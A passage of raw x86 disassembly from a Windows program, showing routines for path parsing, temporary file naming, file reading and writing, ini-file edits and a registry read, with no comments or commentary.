  405ea2:	8d 04 46             	lea    (%esi,%eax,2),%eax
  405ea5:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  405ea9:	74 0c                	je     0x405eb7
  405eab:	50                   	push   %eax
  405eac:	56                   	push   %esi
  405ead:	ff 15 fc 81 40 00    	call   *0x4081fc
  405eb3:	3b c6                	cmp    %esi,%eax
  405eb5:	77 ee                	ja     0x405ea5
  405eb7:	66 83 20 00          	andw   $0x0,(%eax)
  405ebb:	83 c0 02             	add    $0x2,%eax
  405ebe:	5e                   	pop    %esi
  405ebf:	c2 04 00             	ret    $0x4
  405ec2:	8b 54 24 04          	mov    0x4(%esp),%edx
  405ec6:	66 8b 0a             	mov    (%edx),%cx
  405ec9:	8b c1                	mov    %ecx,%eax
  405ecb:	0c 20                	or     $0x20,%al
  405ecd:	66 83 f9 5c          	cmp    $0x5c,%cx
  405ed1:	75 06                	jne    0x405ed9
  405ed3:	66 39 4a 02          	cmp    %cx,0x2(%edx)
  405ed7:	74 13                	je     0x405eec
  405ed9:	66 3d 61 00          	cmp    $0x61,%ax
  405edd:	72 12                	jb     0x405ef1
  405edf:	66 3d 7a 00          	cmp    $0x7a,%ax
  405ee3:	77 0c                	ja     0x405ef1
  405ee5:	66 83 7a 02 3a       	cmpw   $0x3a,0x2(%edx)
  405eea:	75 05                	jne    0x405ef1
  405eec:	33 c0                	xor    %eax,%eax
  405eee:	40                   	inc    %eax
  405eef:	eb 02                	jmp    0x405ef3
  405ef1:	33 c0                	xor    %eax,%eax
  405ef3:	c2 04 00             	ret    $0x4
  405ef6:	53                   	push   %ebx
  405ef7:	56                   	push   %esi
  405ef8:	8b 35 08 82 40 00    	mov    0x408208,%esi
  405efe:	57                   	push   %edi
  405eff:	8b 7c 24 10          	mov    0x10(%esp),%edi
  405f03:	57                   	push   %edi
  405f04:	ff d6                	call   *%esi
  405f06:	8b d8                	mov    %eax,%ebx
  405f08:	53                   	push   %ebx
  405f09:	ff d6                	call   *%esi
  405f0b:	66 8b 0f             	mov    (%edi),%cx
  405f0e:	66 85 c9             	test   %cx,%cx
  405f11:	74 12                	je     0x405f25
  405f13:	66 83 3b 3a          	cmpw   $0x3a,(%ebx)
  405f17:	75 0c                	jne    0x405f25
  405f19:	66 83 7b 02 5c       	cmpw   $0x5c,0x2(%ebx)
  405f1e:	75 05                	jne    0x405f25
  405f20:	50                   	push   %eax
  405f21:	ff d6                	call   *%esi
  405f23:	eb 28                	jmp    0x405f4d
  405f25:	66 83 f9 5c          	cmp    $0x5c,%cx
  405f29:	75 20                	jne    0x405f4b
  405f2b:	66 39 4f 02          	cmp    %cx,0x2(%edi)
  405f2f:	75 1a                	jne    0x405f4b
  405f31:	6a 02                	push   $0x2
  405f33:	5e                   	pop    %esi
  405f34:	6a 5c                	push   $0x5c
  405f36:	50                   	push   %eax
  405f37:	4e                   	dec    %esi
  405f38:	e8 3b ff ff ff       	call   0x405e78
  405f3d:	66 83 38 00          	cmpw   $0x0,(%eax)
  405f41:	74 08                	je     0x405f4b
  405f43:	40                   	inc    %eax
  405f44:	40                   	inc    %eax
  405f45:	85 f6                	test   %esi,%esi
  405f47:	75 eb                	jne    0x405f34
  405f49:	eb 02                	jmp    0x405f4d
  405f4b:	33 c0                	xor    %eax,%eax
  405f4d:	5f                   	pop    %edi
  405f4e:	5e                   	pop    %esi
  405f4f:	5b                   	pop    %ebx
  405f50:	c2 04 00             	ret    $0x4
  405f53:	56                   	push   %esi
  405f54:	57                   	push   %edi
  405f55:	ff 74 24 0c          	push   0xc(%esp)
  405f59:	be 10 57 42 00       	mov    $0x425710,%esi
  405f5e:	56                   	push   %esi
  405f5f:	e8 18 06 00 00       	call   0x40657c
  405f64:	56                   	push   %esi
  405f65:	e8 8c ff ff ff       	call   0x405ef6
  405f6a:	8b f8                	mov    %eax,%edi
  405f6c:	85 ff                	test   %edi,%edi
  405f6e:	75 04                	jne    0x405f74
  405f70:	33 c0                	xor    %eax,%eax
  405f72:	eb 58                	jmp    0x405fcc
  405f74:	57                   	push   %edi
  405f75:	e8 b0 08 00 00       	call   0x40682a
  405f7a:	f6 05 38 9a 42 00 80 	testb  $0x80,0x429a38
  405f81:	74 0e                	je     0x405f91
  405f83:	66 8b 07             	mov    (%edi),%ax
  405f86:	66 85 c0             	test   %ax,%ax
  405f89:	74 e5                	je     0x405f70
  405f8b:	66 3d 5c 00          	cmp    $0x5c,%ax
  405f8f:	74 df                	je     0x405f70
  405f91:	2b fe                	sub    %esi,%edi
  405f93:	d1 ff                	sar    $1,%edi
  405f95:	eb 14                	jmp    0x405fab
  405f97:	e8 3d 09 00 00       	call   0x4068d9
  405f9c:	85 c0                	test   %eax,%eax
  405f9e:	74 05                	je     0x405fa5
  405fa0:	f6 00 10             	testb  $0x10,(%eax)
  405fa3:	74 cb                	je     0x405f70
  405fa5:	56                   	push   %esi
  405fa6:	e8 ec fe ff ff       	call   0x405e97
  405fab:	56                   	push   %esi
  405fac:	e8 e1 05 00 00       	call   0x406592
  405fb1:	3b c7                	cmp    %edi,%eax
  405fb3:	56                   	push   %esi
  405fb4:	7f e1                	jg     0x405f97
  405fb6:	e8 90 fe ff ff       	call   0x405e4b
  405fbb:	56                   	push   %esi
  405fbc:	ff 15 dc 80 40 00    	call   *0x4080dc
  405fc2:	33 c9                	xor    %ecx,%ecx
  405fc4:	83 f8 ff             	cmp    $0xffffffff,%eax
  405fc7:	0f 95 c1             	setne  %cl
  405fca:	8b c1                	mov    %ecx,%eax
  405fcc:	5f                   	pop    %edi
  405fcd:	5e                   	pop    %esi
  405fce:	c2 04 00             	ret    $0x4
  405fd1:	55                   	push   %ebp
  405fd2:	8b ec                	mov    %esp,%ebp
  405fd4:	51                   	push   %ecx
  405fd5:	53                   	push   %ebx
  405fd6:	56                   	push   %esi
  405fd7:	57                   	push   %edi
  405fd8:	8b 3d 28 81 40 00    	mov    0x408128,%edi
  405fde:	ff 75 0c             	push   0xc(%ebp)
  405fe1:	ff d7                	call   *%edi
  405fe3:	8b 75 08             	mov    0x8(%ebp),%esi
  405fe6:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405fe9:	eb 27                	jmp    0x406012
  405feb:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405fee:	ff 75 0c             	push   0xc(%ebp)
  405ff1:	8a 1c 30             	mov    (%eax,%esi,1),%bl
  405ff4:	80 24 30 00          	andb   $0x0,(%eax,%esi,1)
  405ff8:	56                   	push   %esi
  405ff9:	ff 15 6c 80 40 00    	call   *0x40806c
  405fff:	85 c0                	test   %eax,%eax
  406001:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406004:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  406007:	74 1a                	je     0x406023
  406009:	56                   	push   %esi
  40600a:	ff 15 74 82 40 00    	call   *0x408274
  406010:	8b f0                	mov    %eax,%esi
  406012:	56                   	push   %esi
  406013:	ff d7                	call   *%edi
  406015:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  406018:	7d d1                	jge    0x405feb
  40601a:	33 c0                	xor    %eax,%eax
  40601c:	5f                   	pop    %edi
  40601d:	5e                   	pop    %esi
  40601e:	5b                   	pop    %ebx
  40601f:	c9                   	leave
  406020:	c2 08 00             	ret    $0x8
  406023:	8b c6                	mov    %esi,%eax
  406025:	eb f5                	jmp    0x40601c
  406027:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40602b:	56                   	push   %esi
  40602c:	8b 74 24 10          	mov    0x10(%esp),%esi
  406030:	85 f6                	test   %esi,%esi
  406032:	76 0f                	jbe    0x406043
  406034:	8b 44 24 0c          	mov    0xc(%esp),%eax
  406038:	2b c1                	sub    %ecx,%eax
  40603a:	8a 14 08             	mov    (%eax,%ecx,1),%dl
  40603d:	88 11                	mov    %dl,(%ecx)
  40603f:	41                   	inc    %ecx
  406040:	4e                   	dec    %esi
  406041:	75 f7                	jne    0x40603a
  406043:	5e                   	pop    %esi
  406044:	c2 0c 00             	ret    $0xc
  406047:	56                   	push   %esi
  406048:	ff 74 24 08          	push   0x8(%esp)
  40604c:	ff 15 dc 80 40 00    	call   *0x4080dc
  406052:	8b f0                	mov    %eax,%esi
  406054:	83 fe ff             	cmp    $0xffffffff,%esi
  406057:	74 0d                	je     0x406066
  406059:	24 fe                	and    $0xfe,%al
  40605b:	50                   	push   %eax
  40605c:	ff 74 24 0c          	push   0xc(%esp)
  406060:	ff 15 d8 80 40 00    	call   *0x4080d8
  406066:	8b c6                	mov    %esi,%eax
  406068:	5e                   	pop    %esi
  406069:	c2 04 00             	ret    $0x4
  40606c:	ff 74 24 04          	push   0x4(%esp)
  406070:	ff 15 dc 80 40 00    	call   *0x4080dc
  406076:	8b c8                	mov    %eax,%ecx
  406078:	6a 00                	push   $0x0
  40607a:	41                   	inc    %ecx
  40607b:	f7 d9                	neg    %ecx
  40607d:	1b c9                	sbb    %ecx,%ecx
  40607f:	23 c8                	and    %eax,%ecx
  406081:	51                   	push   %ecx
  406082:	ff 74 24 14          	push   0x14(%esp)
  406086:	6a 00                	push   $0x0
  406088:	6a 01                	push   $0x1
  40608a:	ff 74 24 1c          	push   0x1c(%esp)
  40608e:	ff 74 24 1c          	push   0x1c(%esp)
  406092:	ff 15 70 80 40 00    	call   *0x408070
  406098:	c2 0c 00             	ret    $0xc
  40609b:	55                   	push   %ebp
  40609c:	8b ec                	mov    %esp,%ebp
  40609e:	51                   	push   %ecx
  40609f:	51                   	push   %ecx
  4060a0:	56                   	push   %esi
  4060a1:	8b 75 08             	mov    0x8(%ebp),%esi
  4060a4:	57                   	push   %edi
  4060a5:	6a 64                	push   $0x64
  4060a7:	5f                   	pop    %edi
  4060a8:	a1 78 a5 40 00       	mov    0x40a578,%eax
  4060ad:	4f                   	dec    %edi
  4060ae:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4060b1:	a1 7c a5 40 00       	mov    0x40a57c,%eax
  4060b6:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4060b9:	ff 15 d0 80 40 00    	call   *0x4080d0
  4060bf:	6a 1a                	push   $0x1a
  4060c1:	33 d2                	xor    %edx,%edx
  4060c3:	59                   	pop    %ecx
  4060c4:	f7 f1                	div    %ecx
  4060c6:	56                   	push   %esi
  4060c7:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4060ca:	6a 00                	push   $0x0
  4060cc:	50                   	push   %eax
  4060cd:	ff 75 0c             	push   0xc(%ebp)
  4060d0:	66 01 55 fc          	add    %dx,-0x4(%ebp)
  4060d4:	ff 15 74 80 40 00    	call   *0x408074
  4060da:	85 c0                	test   %eax,%eax
  4060dc:	75 0d                	jne    0x4060eb
  4060de:	85 ff                	test   %edi,%edi
  4060e0:	75 c6                	jne    0x4060a8
  4060e2:	66 21 3e             	and    %di,(%esi)
  4060e5:	5f                   	pop    %edi
  4060e6:	5e                   	pop    %esi
  4060e7:	c9                   	leave
  4060e8:	c2 08 00             	ret    $0x8
  4060eb:	8b c6                	mov    %esi,%eax
  4060ed:	eb f6                	jmp    0x4060e5
  4060ef:	55                   	push   %ebp
  4060f0:	8b ec                	mov    %esp,%ebp
  4060f2:	56                   	push   %esi
  4060f3:	8b 75 10             	mov    0x10(%ebp),%esi
  4060f6:	8d 45 10             	lea    0x10(%ebp),%eax
  4060f9:	6a 00                	push   $0x0
  4060fb:	50                   	push   %eax
  4060fc:	56                   	push   %esi
  4060fd:	ff 75 0c             	push   0xc(%ebp)
  406100:	ff 75 08             	push   0x8(%ebp)
  406103:	ff 15 30 81 40 00    	call   *0x408130
  406109:	85 c0                	test   %eax,%eax
  40610b:	74 0a                	je     0x406117
  40610d:	3b 75 10             	cmp    0x10(%ebp),%esi
  406110:	75 05                	jne    0x406117
  406112:	33 c0                	xor    %eax,%eax
  406114:	40                   	inc    %eax
  406115:	eb 02                	jmp    0x406119
  406117:	33 c0                	xor    %eax,%eax
  406119:	5e                   	pop    %esi
  40611a:	5d                   	pop    %ebp
  40611b:	c2 0c 00             	ret    $0xc
  40611e:	55                   	push   %ebp
  40611f:	8b ec                	mov    %esp,%ebp
  406121:	56                   	push   %esi
  406122:	8b 75 10             	mov    0x10(%ebp),%esi
  406125:	8d 45 10             	lea    0x10(%ebp),%eax
  406128:	6a 00                	push   $0x0
  40612a:	50                   	push   %eax
  40612b:	56                   	push   %esi
  40612c:	ff 75 0c             	push   0xc(%ebp)
  40612f:	ff 75 08             	push   0x8(%ebp)
  406132:	ff 15 b8 80 40 00    	call   *0x4080b8
  406138:	85 c0                	test   %eax,%eax
  40613a:	74 0a                	je     0x406146
  40613c:	3b 75 10             	cmp    0x10(%ebp),%esi
  40613f:	75 05                	jne    0x406146
  406141:	33 c0                	xor    %eax,%eax
  406143:	40                   	inc    %eax
  406144:	eb 02                	jmp    0x406148
  406146:	33 c0                	xor    %eax,%eax
  406148:	5e                   	pop    %esi
  406149:	5d                   	pop    %ebp
  40614a:	c2 0c 00             	ret    $0xc
  40614d:	55                   	push   %ebp
  40614e:	8b ec                	mov    %esp,%ebp
  406150:	53                   	push   %ebx
  406151:	8b 5d 08             	mov    0x8(%ebp),%ebx
  406154:	56                   	push   %esi
  406155:	8b 35 34 81 40 00    	mov    0x408134,%esi
  40615b:	57                   	push   %edi
  40615c:	33 ff                	xor    %edi,%edi
  40615e:	6a 01                	push   $0x1
  406160:	57                   	push   %edi
  406161:	57                   	push   %edi
  406162:	53                   	push   %ebx
  406163:	ff d6                	call   *%esi
  406165:	85 c0                	test   %eax,%eax
  406167:	75 4f                	jne    0x4061b8
  406169:	8d 45 0a             	lea    0xa(%ebp),%eax
  40616c:	6a 02                	push   $0x2
  40616e:	50                   	push   %eax
  40616f:	53                   	push   %ebx
  406170:	e8 7a ff ff ff       	call   0x4060ef
  406175:	85 c0                	test   %eax,%eax
  406177:	74 0c                	je     0x406185
  406179:	66 81 7d 0a ff fe    	cmpw   $0xfeff,0xa(%ebp)
  40617f:	75 04                	jne    0x406185
  406181:	33 c0                	xor    %eax,%eax
  406183:	eb 36                	jmp    0x4061bb
  406185:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  406188:	74 28                	je     0x4061b2
  40618a:	6a 01                	push   $0x1
  40618c:	57                   	push   %edi
  40618d:	57                   	push   %edi
  40618e:	53                   	push   %ebx
  40618f:	ff d6                	call   *%esi
  406191:	85 c0                	test   %eax,%eax
  406193:	75 1d                	jne    0x4061b2
  406195:	6a 02                	push   $0x2
  406197:	68 14 84 40 00       	push   $0x408414
  40619c:	53                   	push   %ebx
  40619d:	e8 7c ff ff ff       	call   0x40611e
  4061a2:	f7 d8                	neg    %eax
  4061a4:	1b c0                	sbb    %eax,%eax
  4061a6:	25 fb bf ff 7f       	and    $0x7fffbffb,%eax
  4061ab:	05 05 40 00 80       	add    $0x80004005,%eax
  4061b0:	eb 09                	jmp    0x4061bb
  4061b2:	57                   	push   %edi
  4061b3:	57                   	push   %edi
  4061b4:	57                   	push   %edi
  4061b5:	53                   	push   %ebx
  4061b6:	ff d6                	call   *%esi
  4061b8:	33 c0                	xor    %eax,%eax
  4061ba:	40                   	inc    %eax
  4061bb:	5f                   	pop    %edi
  4061bc:	5e                   	pop    %esi
  4061bd:	5b                   	pop    %ebx
  4061be:	5d                   	pop    %ebp
  4061bf:	c2 08 00             	ret    $0x8
  4061c2:	53                   	push   %ebx
  4061c3:	8b 1d ec 80 40 00    	mov    0x4080ec,%ebx
  4061c9:	55                   	push   %ebp
  4061ca:	56                   	push   %esi
  4061cb:	8b 74 24 14          	mov    0x14(%esp),%esi
  4061cf:	57                   	push   %edi
  4061d0:	85 f6                	test   %esi,%esi
  4061d2:	c7 05 a8 65 42 00 4e 	movl   $0x55004e,0x4265a8
  4061d9:	00 55 00 
  4061dc:	c7 05 ac 65 42 00 4c 	movl   $0x4c,0x4265ac
  4061e3:	00 00 00 
  4061e6:	bf 00 04 00 00       	mov    $0x400,%edi
  4061eb:	bd a8 65 42 00       	mov    $0x4265a8,%ebp
  4061f0:	74 26                	je     0x406218
  4061f2:	6a 01                	push   $0x1
  4061f4:	6a 00                	push   $0x0
  4061f6:	56                   	push   %esi
  4061f7:	e8 70 fe ff ff       	call   0x40606c
  4061fc:	50                   	push   %eax
  4061fd:	ff 15 fc 80 40 00    	call   *0x4080fc
  406203:	57                   	push   %edi
  406204:	55                   	push   %ebp
  406205:	56                   	push   %esi
  406206:	ff d3                	call   *%ebx
  406208:	85 c0                	test   %eax,%eax
  40620a:	0f 84 27 01 00 00    	je     0x406337
  406210:	3b c7                	cmp    %edi,%eax
  406212:	0f 8f 1f 01 00 00    	jg     0x406337
  406218:	be a8 6d 42 00       	mov    $0x426da8,%esi
  40621d:	57                   	push   %edi
  40621e:	56                   	push   %esi
  40621f:	ff 74 24 1c          	push   0x1c(%esp)
  406223:	ff d3                	call   *%ebx
  406225:	85 c0                	test   %eax,%eax
  406227:	0f 84 0a 01 00 00    	je     0x406337
  40622d:	3b c7                	cmp    %edi,%eax
  40622f:	0f 8f 02 01 00 00    	jg     0x406337
  406235:	56                   	push   %esi
  406236:	55                   	push   %ebp
  406237:	68 90 a5 40 00       	push   $0x40a590
  40623c:	68 a8 61 42 00       	push   $0x4261a8
  406241:	ff 15 78 82 40 00    	call   *0x408278
  406247:	8b d8                	mov    %eax,%ebx
  406249:	a1 30 9a 42 00       	mov    0x429a30,%eax
  40624e:	83 c4 10             	add    $0x10,%esp
  406251:	ff b0 28 01 00 00    	push   0x128(%eax)
  406257:	56                   	push   %esi
  406258:	e8 5c 03 00 00       	call   0x4065b9
  40625d:	6a 04                	push   $0x4
  40625f:	68 00 00 00 c0       	push   $0xc0000000
  406264:	56                   	push   %esi
  406265:	e8 02 fe ff ff       	call   0x40606c
  40626a:	8b e8                	mov    %eax,%ebp
  40626c:	83 fd ff             	cmp    $0xffffffff,%ebp
  40626f:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  406273:	0f 84 be 00 00 00    	je     0x406337
  406279:	6a 00                	push   $0x0
  40627b:	55                   	push   %ebp
  40627c:	ff 15 cc 80 40 00    	call   *0x4080cc
  406282:	8b f8                	mov    %eax,%edi
  406284:	8d 44 1f 0a          	lea    0xa(%edi,%ebx,1),%eax
  406288:	50                   	push   %eax
  406289:	6a 40                	push   $0x40
  40628b:	ff 15 10 81 40 00    	call   *0x408110
  406291:	8b f0                	mov    %eax,%esi
  406293:	85 f6                	test   %esi,%esi
  406295:	0f 84 95 00 00 00    	je     0x406330
  40629b:	57                   	push   %edi
  40629c:	56                   	push   %esi
  40629d:	55                   	push   %ebp
  40629e:	e8 4c fe ff ff       	call   0x4060ef
  4062a3:	85 c0                	test   %eax,%eax
  4062a5:	0f 84 85 00 00 00    	je     0x406330
  4062ab:	68 84 a5 40 00       	push   $0x40a584
  4062b0:	56                   	push   %esi
  4062b1:	e8 1b fd ff ff       	call   0x405fd1
  4062b6:	85 c0                	test   %eax,%eax
  4062b8:	75 14                	jne    0x4062ce
  4062ba:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  4062bd:	68 84 a5 40 00       	push   $0x40a584
  4062c2:	50                   	push   %eax
  4062c3:	ff 15 4c 81 40 00    	call   *0x40814c
  4062c9:	83 c7 0a             	add    $0xa,%edi
  4062cc:	eb 35                	jmp    0x406303
  4062ce:	83 c0 0a             	add    $0xa,%eax
  4062d1:	68 80 a5 40 00       	push   $0x40a580
  4062d6:	50                   	push   %eax
  4062d7:	e8 f5 fc ff ff       	call   0x405fd1
  4062dc:	8b e8                	mov    %eax,%ebp
  4062de:	85 ed                	test   %ebp,%ebp
  4062e0:	74 1d                	je     0x4062ff
  4062e2:	8d 0c 3e             	lea    (%esi,%edi,1),%ecx
  4062e5:	8d 04 19             	lea    (%ecx,%ebx,1),%eax
  4062e8:	eb 06                	jmp    0x4062f0
  4062ea:	8a 11                	mov    (%ecx),%dl
  4062ec:	88 10                	mov    %dl,(%eax)
  4062ee:	48                   	dec    %eax
  4062ef:	49                   	dec    %ecx
  4062f0:	3b cd                	cmp    %ebp,%ecx
  4062f2:	77 f6                	ja     0x4062ea
  4062f4:	2b ee                	sub    %esi,%ebp
  4062f6:	45                   	inc    %ebp
  4062f7:	8b c5                	mov    %ebp,%eax
  4062f9:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  4062fd:	eb 06                	jmp    0x406305
  4062ff:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  406303:	8b c7                	mov    %edi,%eax
  406305:	53                   	push   %ebx
  406306:	03 c6                	add    %esi,%eax
  406308:	68 a8 61 42 00       	push   $0x4261a8
  40630d:	50                   	push   %eax
  40630e:	e8 14 fd ff ff       	call   0x406027
  406313:	33 c0                	xor    %eax,%eax
  406315:	50                   	push   %eax
  406316:	50                   	push   %eax
  406317:	50                   	push   %eax
  406318:	55                   	push   %ebp
  406319:	ff 15 34 81 40 00    	call   *0x408134
  40631f:	03 fb                	add    %ebx,%edi
  406321:	57                   	push   %edi
  406322:	56                   	push   %esi
  406323:	55                   	push   %ebp
  406324:	e8 f5 fd ff ff       	call   0x40611e
  406329:	56                   	push   %esi
  40632a:	ff 15 0c 81 40 00    	call   *0x40810c
  406330:	55                   	push   %ebp
  406331:	ff 15 fc 80 40 00    	call   *0x4080fc
  406337:	5f                   	pop    %edi
  406338:	5e                   	pop    %esi
  406339:	5d                   	pop    %ebp
  40633a:	5b                   	pop    %ebx
  40633b:	c3                   	ret
  40633c:	6a 05                	push   $0x5
  40633e:	ff 74 24 0c          	push   0xc(%esp)
  406342:	ff 74 24 0c          	push   0xc(%esp)
  406346:	ff 15 50 81 40 00    	call   *0x408150
  40634c:	85 c0                	test   %eax,%eax
  40634e:	75 0f                	jne    0x40635f
  406350:	ff 74 24 08          	push   0x8(%esp)
  406354:	ff 74 24 08          	push   0x8(%esp)
  406358:	e8 65 fe ff ff       	call   0x4061c2
  40635d:	59                   	pop    %ecx
  40635e:	59                   	pop    %ecx
  40635f:	ff 05 b0 9a 42 00    	incl   0x429ab0
  406365:	c2 08 00             	ret    $0x8
  406368:	53                   	push   %ebx
  406369:	33 db                	xor    %ebx,%ebx
  40636b:	38 1d dc 9a 42 00    	cmp    %bl,0x429adc
  406371:	56                   	push   %esi
  406372:	8b 74 24 10          	mov    0x10(%esp),%esi
  406376:	57                   	push   %edi
  406377:	0f 9c c3             	setl   %bl
  40637a:	8b 06                	mov    (%esi),%eax
  40637c:	8b 7c 24 10          	mov    0x10(%esp),%edi
  406380:	f7 db                	neg    %ebx
  406382:	1b db                	sbb    %ebx,%ebx
  406384:	32 db                	xor    %bl,%bl
  406386:	81 c3 00 01 00 00    	add    $0x100,%ebx
  40638c:	a8 20                	test   $0x20,%al
  40638e:	74 32                	je     0x4063c2
  406390:	f7 c7 00 00 00 60    	test   $0x60000000,%edi
  406396:	74 2a                	je     0x4063c2
  406398:	8b cf                	mov    %edi,%ecx
  40639a:	ba 00 03 00 00       	mov    $0x300,%edx
  40639f:	c1 e9 15             	shr    $0x15,%ecx
  4063a2:	23 ca                	and    %edx,%ecx
  4063a4:	3b ca                	cmp    %edx,%ecx
  4063a6:	75 0a                	jne    0x4063b2
  4063a8:	8b cb                	mov    %ebx,%ecx
  4063aa:	f7 d1                	not    %ecx
  4063ac:	23 0d d0 9a 42 00    	and    0x429ad0,%ecx
  4063b2:	80 e4 fe             	and    $0xfe,%ah
  4063b5:	0b c1                	or     %ecx,%eax
  4063b7:	80 e4 fd             	and    $0xfd,%ah
  4063ba:	81 e7 ff ff ff 9f    	and    $0x9fffffff,%edi
  4063c0:	eb 0d                	jmp    0x4063cf
  4063c2:	a9 00 00 10 00       	test   $0x100000,%eax
  4063c7:	74 06                	je     0x4063cf
  4063c9:	0b 05 d0 9a 42 00    	or     0x429ad0,%eax
  4063cf:	8b c8                	mov    %eax,%ecx
  4063d1:	23 c3                	and    %ebx,%eax
  4063d3:	81 e1 df ff ef ff    	and    $0xffefffdf,%ecx
  4063d9:	f7 d8                	neg    %eax
  4063db:	1b c0                	sbb    %eax,%eax
  4063dd:	89 0e                	mov    %ecx,(%esi)
  4063df:	f7 d0                	not    %eax
  4063e1:	23 c7                	and    %edi,%eax
  4063e3:	5f                   	pop    %edi
  4063e4:	5e                   	pop    %esi
  4063e5:	5b                   	pop    %ebx
  4063e6:	c2 08 00             	ret    $0x8
  4063e9:	55                   	push   %ebp
  4063ea:	8b ec                	mov    %esp,%ebp
  4063ec:	8d 45 10             	lea    0x10(%ebp),%eax
  4063ef:	50                   	push   %eax
  4063f0:	ff 75 08             	push   0x8(%ebp)
  4063f3:	e8 70 ff ff ff       	call   0x406368
  4063f8:	85 c0                	test   %eax,%eax
  4063fa:	75 05                	jne    0x406401
  4063fc:	6a 06                	push   $0x6
  4063fe:	58                   	pop    %eax
  4063ff:	eb 12                	jmp    0x406413
  406401:	ff 75 14             	push   0x14(%ebp)
  406404:	ff 75 10             	push   0x10(%ebp)
  406407:	6a 00                	push   $0x0
  406409:	ff 75 0c             	push   0xc(%ebp)
  40640c:	50                   	push   %eax
  40640d:	ff 15 28 80 40 00    	call   *0x408028
  406413:	5d                   	pop    %ebp
  406414:	c2 10 00             	ret    $0x10
  406417:	55                   	push   %ebp
  406418:	8b ec                	mov    %esp,%ebp
  40641a:	8d 45 10             	lea    0x10(%ebp),%eax
  40641d:	50                   	push   %eax
  40641e:	ff 75 08             	push   0x8(%ebp)
  406421:	e8 42 ff ff ff       	call   0x406368
  406426:	33 c9                	xor    %ecx,%ecx
  406428:	3b c1                	cmp    %ecx,%eax
  40642a:	75 05                	jne    0x406431
  40642c:	6a 06                	push   $0x6
  40642e:	58                   	pop    %eax
  40642f:	eb 15                	jmp    0x406446
  406431:	51                   	push   %ecx
  406432:	ff 75 14             	push   0x14(%ebp)
  406435:	51                   	push   %ecx
  406436:	ff 75 10             	push   0x10(%ebp)
  406439:	51                   	push   %ecx
  40643a:	51                   	push   %ecx
  40643b:	51                   	push   %ecx
  40643c:	ff 75 0c             	push   0xc(%ebp)
  40643f:	50                   	push   %eax
  406440:	ff 15 2c 80 40 00    	call   *0x40802c
  406446:	5d                   	pop    %ebp
  406447:	c2 10 00             	ret    $0x10
  40644a:	55                   	push   %ebp
  40644b:	8b ec                	mov    %esp,%ebp
  40644d:	51                   	push   %ecx
  40644e:	8d 45 18             	lea    0x18(%ebp),%eax
  406451:	56                   	push   %esi
  406452:	50                   	push   %eax
  406453:	8b 45 18             	mov    0x18(%ebp),%eax
  406456:	f7 d8                	neg    %eax
  406458:	1b c0                	sbb    %eax,%eax
  40645a:	c7 45 fc 00 08 00 00 	movl   $0x800,-0x4(%ebp)
  406461:	25 00 01 00 00       	and    $0x100,%eax
  406466:	0d 19 00 02 00       	or     $0x20019,%eax
  40646b:	50                   	push   %eax
  40646c:	ff 75 0c             	push   0xc(%ebp)
  40646f:	ff 75 08             	push   0x8(%ebp)
  406472:	e8 72 ff ff ff       	call   0x4063e9
  406477:	8b 75 14             	mov    0x14(%ebp),%esi
  40647a:	85 c0                	test   %eax,%eax
  40647c:	75 3c                	jne    0x4064ba
  40647e:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406481:	57                   	push   %edi
  406482:	50                   	push   %eax
  406483:	8d 45 0c             	lea    0xc(%ebp),%eax
  406486:	56                   	push   %esi
  406487:	50                   	push   %eax
  406488:	6a 00                	push   $0x0
  40648a:	ff 75 10             	push   0x10(%ebp)
  40648d:	ff 75 18             	push   0x18(%ebp)
  406490:	ff 15 08 80 40 00    	call   *0x408008
  406496:	ff 75 18             	push   0x18(%ebp)
  406499:	8b f8                	mov    %eax,%edi
  40649b:	ff 15 10 80 40 00    	call   *0x408010
  4064a1:	66 83 a6 fe 07 00 00 	andw   $0x0,0x7fe(%esi)
  4064a8:	00 
  4064a9:	85 ff                	test   %edi,%edi
  4064ab:	5f                   	pop    %edi
  4064ac:	75 0c                	jne    0x4064ba
  4064ae:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  4064b2:	74 0a                	je     0x4064be
  4064b4:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  4064b8:	74 04                	je     0x4064be
  4064ba:	66 83 26 00          	andw   $0x0,(%esi)
  4064be:	5e                   	pop    %esi
  4064bf:	c9                   	leave
  4064c0:	c2 14 00             	ret    $0x14
  4064c3:	ff 74 24 08          	push   0x8(%esp)
  4064c7:	68 18 84 40 00       	push   $0x408418
  4064cc:	ff 74 24 0c          	push   0xc(%esp)
  4064d0:	ff 15 2c 82 40 00    	call   *0x40822c
  4064d6:	83 c4 0c             	add    $0xc,%esp
  4064d9:	c2 08 00             	ret    $0x8
  4064dc:	55                   	push   %ebp
  4064dd:	8b ec                	mov    %esp,%ebp
  4064df:	51                   	push   %ecx
  4064e0:	51                   	push   %ecx
  4064e1:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4064e4:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4064e8:	53                   	push   %ebx
  4064e9:	56                   	push   %esi
  4064ea:	66 83 39 2d          	cmpw   $0x2d,(%ecx)
  4064ee:	6a 0a                	push   $0xa
  4064f0:	58                   	pop    %eax
  4064f1:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  4064f8:	6a 39                	push   $0x39
  4064fa:	5b                   	pop    %ebx
  4064fb:	75 06                	jne    0x406503
  4064fd:	41                   	inc    %ecx
  4064fe:	41                   	inc    %ecx
  4064ff:	83 4d f8 ff          	orl    $0xffffffff,-0x8(%ebp)
  406503:	66 83 39 30          	cmpw   $0x30,(%ecx)
  406507:	75 27                	jne    0x406530
  406509:	41                   	inc    %ecx
  40650a:	41                   	inc    %ecx
  40650b:	66 8b 11             	mov    (%ecx),%dx
  40650e:	66 83 fa 30          	cmp    $0x30,%dx
  406512:	72 0c                	jb     0x406520
